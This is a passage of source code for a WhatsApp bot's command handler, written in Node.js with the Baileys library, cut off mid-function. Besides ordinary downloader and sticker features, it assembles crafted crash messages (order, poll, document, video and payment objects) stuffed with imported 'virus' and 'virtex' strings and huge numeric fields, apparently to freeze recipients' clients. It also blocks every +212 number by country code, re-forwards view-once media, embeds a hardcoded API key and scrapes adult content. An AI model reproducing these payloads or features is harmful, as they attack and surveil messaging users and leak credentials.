require('./settings')
require('./lib/funclist')
require('./lib/listmenu')
const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/list')
const { buttonvirus } = require('./scrape/buttonvirus')
const { buttonvirus2 } = require('./scrape/buttonvirus2')
const { ngazap } = require('./scrape/ngazap')
const { virtex } = require('./scrape/virtex')
const { virus } = require('./scrape/virus')
const { philips } = require('./scrape/philips')
const { santedpc } = require('./lib/santedpc')
const { santedgc } = require('./lib/santedgc')
const { antiSpam } = require('./lib/antispam')
const { color, bgcolor } = require('./lib/color')
const { jadibot, conns } = require('./jadibot')
const { uptotelegra } = require('./scrape/upload')
const { dafontSearch, dafontDown } = require('./scrape/dafont')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess')
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const textpro = require('./scrape/textpro')
const photooxy = require('./scrape/photooxy')
const kirleys = require('@adiwajshing/baileys')
const vm = require('node:vm')
const yts = require("yt-search");
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'))
const pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const dblist = JSON.parse(fs.readFileSync('./database/listall.json'))

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

module.exports = conn = async (conn, m, chatUpdate, store) => {
try {
        const gakbisaowner = `${ownerNomor}@s.whatsapp.net`
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = global.prefijo
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const content = JSON.stringify(m.message)
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "Usuário"
        const botNumber = await conn.decodeJid(conn.user.id)
        const itsMeHyzd = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('america/buenos_aires').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('America/Buenos_Aires').locale('es').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('America/Buenos_Aires').format('HH : mm : ss')
        const wita = moment.tz('America/Buenos_Aires').format('HH : mm : ss')
        const wit = moment.tz('America/Buenos_Aires').format('HH : mm : ss')   
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const tahunBaru = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = tahunBaru - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const idulFitri = new Date('April 22, 2023 00:00:00')
        const ayeuna = new Date().getTime()
        const ceIroh = idulFitri - ayeuna
        const hahari = Math.floor( ceIroh / (1000 * 60 * 60 * 24));
        const hajam = Math.floor( ceIroh % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const hamenit = Math.floor( ceIroh % (1000 * 60 * 60) / (1000 * 60))
        const hadetik = Math.floor( ceIroh % (1000 * 60) / 1000)
        const idulAdha = new Date('Juni 29, 2023 00:00:00')
        const nembe = new Date().getTime()
        const ceDadah = idulAdha - nembe
        const hihari = Math.floor( ceDadah / (1000 * 60 * 60 * 24));
        const hijam = Math.floor( ceDadah % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const himenit = Math.floor( ceDadah % (1000 * 60 * 60) / (1000 * 60))
        const hidetik = Math.floor( ceDadah % (1000 * 60) / 1000)
        const UltahCreator = new Date('Januari 19, 2023 00:00:00')
        const CreatorHyzd = new Date().getTime()
        const BotTiburonWA = UltahCreator - CreatorHyzd
        const Dia = Math.floor( BotTiburonWA / (1000 * 60 * 60 * 24));
        const Hora = Math.floor( BotTiburonWA % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const Minuto = Math.floor( BotTiburonWA % (1000 * 60 * 60) / (1000 * 60))
        const Segundo = Math.floor( BotTiburonWA % (1000 * 60) / 1000)
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPrem = prem.includes(sender)
    	const isUser = pendaftar.includes(sender)
    	const banUser = await conn.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
}
} catch (err) {
console.error(err)
}

if (!conn.public) {
if (!m.key.fromMe) return
}

var mdu = ['red','green','yellow','blue','magenta','cyan','white']
var halalu = mdu[Math.floor(Math.random() * mdu.length)]
var mdo = ['red','green','yellow','blue','magenta','cyan','white']
var halalo = mdo[Math.floor(Math.random() * mdo.length)]
var mdi = ['red','green','yellow','blue','magenta','cyan','white']
var halali = mdi[Math.floor(Math.random() * mdi.length)]
var mda = ['red','green','yellow','blue','magenta','cyan','white']
var halala = mda[Math.floor(Math.random() * mda.length)]
var mde = ['red','green','yellow','blue','magenta','cyan','white']
var halale = mde[Math.floor(Math.random() * mde.length)]

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(' Power-md '), color(`[ MSJ_LOG ]`, `${halalu}`), color(`de`, `${halalo}`), color(`${pushname}`, `${halali}`), color(`txt :`, `${halala}`), color(`${body}`, `${halale}`))
}

if (isCmd && !isUser) {
pendaftar.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
}

if (isCmd && antiSpam.isFiltered(from) && !m.isGroup) {
console.log(color('[ SPAM_LOG ]', 'red'), color(wib, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
return m.reply('「 ❗ 」spam detectado, espere 5 segundos antes de usar un comando')
}
        
if (isCmd && antiSpam.isFiltered(from) && m.isGroup) {
console.log(color('[ SPAM_LOG ]', 'red'), color(wib, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
return m.reply('「 ❗ 」spam detectado, espere 5 segundos antes de usar un comando')
}

if (isCmd && !itsMeHyzd) antiSpam.addFilter(from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

if (m.sender.startsWith('212')) 
return conn.updateBlockStatus(m.sender, 'block')

async function sendconnMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await conn.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const sendSticker = (pesan) => {
conn.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await reSize(ppuser, 300, 300)

const sendvn = (teks) => {
conn.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

for (let anju of vnnye) {
if (budy === anju) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}

if (m.isGroup && m.mtype == 'viewOnceMessage') {
let teks = 
`╭「 *Anti ViewOnce* 」
├ *Nombre* : ${pushname}
├ *Tag* : @${m.sender.split("@")[0]}
├ *Hora* : ${wib} 
└ *Msj* : ${m.mtype}`
conn.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
m.copyNForward(m.chat, true, {readViewOnce: true}, {quoted: m}).catch(_ => m.reply('p'))
}

//JSONNNN
const ntilink = JSON.parse(fs.readFileSync("./json/antilink.json"))

//
const AntiLink = m.isGroup ? ntilink.includes(m.chat) : false 

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": wm, 
"jpegThumbnail": ppnyauser
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '6287705048235@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: ppnyauser } } }

const troli = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
message: {
orderMessage: {
itemCount : 999999999999999999,
status: 99999999999999999999,
surface : 9999999999999999,
message: virus,
orderTitle: virus,
thumbnail: ppnyauser,
sellerJid: '0@s.whatsapp.net'
},
},
};

const reply = (teks) => {
conn.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : m })
}

const banRep = () => {
conn.sendMessage(m.chat, {
text:`Lo sentimos, ha sido baneado, por favor chatee con @${creator.split("@")[0]} para el desbaneo`,
mentions: [creator],
},
{
quoted:m
})
}

if (isCmd && isBanned) {
return banRep()
}

const crsh = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `${wm} ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

let list = []
for (let i of owner) {
list.push({
displayName: await conn.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await conn.getName(i + '@s.whatsapp.net')}\n
FN:${await conn.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:devolperk@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://bit.ly/39Ivus6\n
item3.X-ABLabel:YouTube\n
item4.ADR:;; Argentina ;;;;\n
item4.X-ABLabel: País\n
END:VCARD`
})
}

const voll = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
"message": {
"pollCreationMessage": {
"name": `${wm} ${virus}${virtex(prefix)}`,
"options": [
	{
"optionName": "𝐏𝚯͢𝐖𝐄𝐑 - 𝐌𝐃"
	},
	{
"optionName": "Mejor bot?"
	},
	{
"optionName": "HyzdMod"
	},
	{
"optionName": "2022"
	},
	{
"optionName": "𝐏𝚯͢𝐖𝐄𝐑 - 𝐌𝐃"
	}
],
"selectableOptionsCount": 5
}}}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: '𝐏𝚯͢𝐖𝐄𝐑 - 𝐌𝐃',
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: author
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "USD"
			}
		}
	}
}

const gifes = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
"message": { 
"videoMessage": { 
"title": `${virtex(prefix)}`,
"h": `${virus}`,
'duration': '99999', 
'gifPlayback': 'true', 
'caption': `${virus}${virtex(prefix)}`,
'jpegThumbnail': ppnyauser
}}}

const vien = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"orderMessage": {
"orderId": "594071395007984",
"thumbnail": ppnyauser,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${wm} ${ngazap(prefix)}`,
"orderTitle": "${wm} ${ngazap(prefix)}",
"sellerJid": "5493865362492@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR"
}}}

let rn = ['recording','composing']
let jd = rn[Math.floor(Math.random() * rn.length)];

if (command) {
//conn.sendPresenceUpdate(jd, from)
conn.readMessages([m.key])
}

const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)

function simpan(path, buff) {
    fs.writeFileSync(path, buff)
    return path
}
function getRandom(ext) {
    ext = ext || ""
    return `${Math.floor(Math.random() * 100000)}.${ext}`
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await conn.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await conn.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

async function sendPoll(jid, text, list) {
conn.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function bygbt(text) {
conn.sendMessage(text, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}

const bottiburon = "5493865362492@s.whatsapp.net"
const mark = "0@s.whatsapp.net"
const timestamp = speed()
const latensi = speed() - timestamp
const butlocNye = [
{buttonId: `${prefix}owner`, buttonText: {displayText: '𝗢𝗪𝗡𝗘𝗥'}, type: 1},
{buttonId: `${prefix}sewabot`, buttonText: {displayText: '𝗦𝗘𝗪𝗔𝗕𝗢𝗧'}, type: 1}
]
const buttonLocnya = {
location: { jpegThumbnail: ppnyauser } ,
caption: `Hola @${sender.split("@")[0]} 
𝘚𝘢𝘺𝘢 𝘒𝘢𝘺𝘭𝘢 𝘉𝘰𝘵 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘠𝘢𝘯𝘨 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘯𝘵𝘶 𝘈𝘯𝘥𝘢 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘚𝘵𝘪𝘤𝘬𝘦𝘳, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘛𝘪𝘬𝘵𝘰𝘬, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘠𝘰𝘶𝘵𝘶𝘣𝘦, 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘓𝘰𝘨𝘰 𝘛𝘦𝘹𝘵 𝘗𝘳𝘰/𝘗𝘩𝘰𝘵𝘰𝘰𝘹𝘺/𝘌𝘱𝘩𝘰𝘵𝘰360, 𝘋𝘢𝘯 𝘓𝘢𝘪𝘯-𝘭𝘢𝘪𝘯.

Nama ${itsMeHyzd ? 'Owner' : 'User'} : ${pushname}
Nomor ${itsMeHyzd ? 'Owner' : 'User'} : ${sender.split("@")[0]}
Jumlah User : ${pendaftar.length} User
Status : ${itsMeHyzd ? 'Owner' : 'User'}
Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
Runtime Bot : ${runtime(process.uptime())}
Speed Bot : ${latensi.toFixed(4)} 𝘋𝘦𝘵𝘪𝘬
Otw Tahun Baru : ${jhari} 𝑯𝒂𝒓𝒊 ${jjam} 𝑱𝒂𝒎 ${jmenit} 𝑴𝒆𝒏𝒊𝒕 ${jdetik} 𝑫𝒆𝒕𝒊𝒌
Otw Idul Fitri : ${hahari} 𝑯𝒂𝒓𝒊 ${hajam} 𝑱𝒂𝒎 ${hamenit} 𝑴𝒆𝒏𝒊𝒕 ${hadetik} 𝑫𝒆𝒕𝒊𝒌
Otw Idul Adha : ${hihari} 𝑯𝒂𝒓𝒊 ${hijam} 𝑱𝒂𝒎 ${himenit} 𝑴𝒆𝒏𝒊𝒕 ${hidetik} 𝑫𝒆𝒕𝒊𝒌
Otw Ultah Creator : ${Dia} 𝑯𝒂𝒓𝒊 ${Hora} 𝑱𝒂𝒎 ${Minuto} 𝑴𝒆𝒏𝒊𝒕 ${Segundo} 𝑫𝒆𝒕𝒊𝒌

𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼
𝗔𝗹𝗹𝗮𝗵 𝗦𝗪𝗧
𝗡𝗮𝗯𝗶 𝗠𝘂𝗵𝗮𝗺𝗺𝗮𝗱 𝗦𝗔𝗪
𝗢𝗿𝗮𝗻𝗴 𝗧𝘂𝗮
𝗞𝗮𝘆𝗹𝗮 𝗕𝗼𝘁
𝗨𝘀𝗲𝗿 𝗕𝗼𝘁`,
mentions : [sender, bottiburon, mark],
footer: `Created By @${bottiburon.split("@")[0]}
WhatsApp By @${mark.split("@")[0]}`,
buttons: butlocNye,
headerType: "LOCATION"
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "24yjkNG4jrXeh1WcMdMJMWD2",
    ...form.getHeaders()
  }
})
return res.data
}

async function getFile(media) {
        let data = Buffer.isBuffer(media) ? media : isUrl(media) ? await ( await fetch(media)).buffer() : fs.existsSync(media) ? fs.readFileSync(media) : /^data:.*?\/.*?;base64,/i.test(media) ? Buffer.from(media.split(",")[1]) : null
        if (!data) return new Error("Result is not a buffer")
        let type = await FileType.fromBuffer(data) || {
          mime: "application/octet-stream",
          ext: ".bin"
        }
        return {
          data,
          ...type
        }
      }

async function sendFile(jid, media, options={}) {
        let file = await getFile(media)
        let mime = file.ext, type
        if (mime == "mp3") {
          type = "audio"
          options.mimetype = "audio/mpeg"
          options.ptt = options.ptt || false
        }
        else if (mime == "jpg" || mime == "jpeg" || mime == "png") type = "image"
        else if (mime == "webp") type = "sticker"
        else if (mime == "mp4") type = "video"
        else type = "document"
        return conn.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
      }

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function genProfile(conn, m) {
   let font = await Jimp.loadFont('./name.fnt'), 
     mask = await Jimp.read('https://i.imgur.com/552kzaW.png'), 
     welcome = await Jimp.read("https://telegra.ph/file/81260a8b9e8cff26d2b48.jpg"), 
     avatar = await Jimp.read(await conn.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')), 
     status = (await conn.fetchStatus(m.sender).catch(console.log) || {}).status?.slice(0, 30) || 'No detectado' 
     await avatar.resize(460, 460) 
     await mask.resize(460, 460) 
     await avatar.mask(mask) 
     await welcome.resize(welcome.getWidth(), welcome.getHeight()) 
     await welcome.print(font, 550, 180, 'Nombre:') 
     await welcome.print(font, 650, 255, m.pushName.slice(0, 25)) 
     await welcome.print(font, 550, 340, 'Bio:') 
     await welcome.print(font, 650, 415, status) 
     await welcome.print(font, 550, 500, 'Numero:') 
     await welcome.print(font, 650, 575, PhoneNumber('+' + m.sender.split('@')[0]).getNumber('international')) 
     return await welcome.composite(avatar, 50, 170).getBufferAsync('image/png') 
}

async function tiktokdl(url) {
    try {
        const tokenn = await axios.get("https://downvideo.quora-wiki.com/tiktok-video-downloader#url=" + url);
        let a = cheerio.load(tokenn.data);
        let token = a("#token").attr("value");
        const param = {
            url: url,
            token: token,
        };
        const { data } = await axios.request("https://downvideo.quora-wiki.com/system/action.php", {
                method: "post",
                data: new URLSearchParams(Object.entries(param)),
                headers: {
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
                    "referer": "https://downvideo.quora-wiki.com/tiktok-video-downloader",
                },
            }
        );
        return {
            status: 200,
            title: data.title,
            thumbnail: "https:" + data.thumbnail,
            duration: data.duration,
            media: data.medias,
        };
    } catch (e) {
        return e
    }
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `Hyzdmod`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
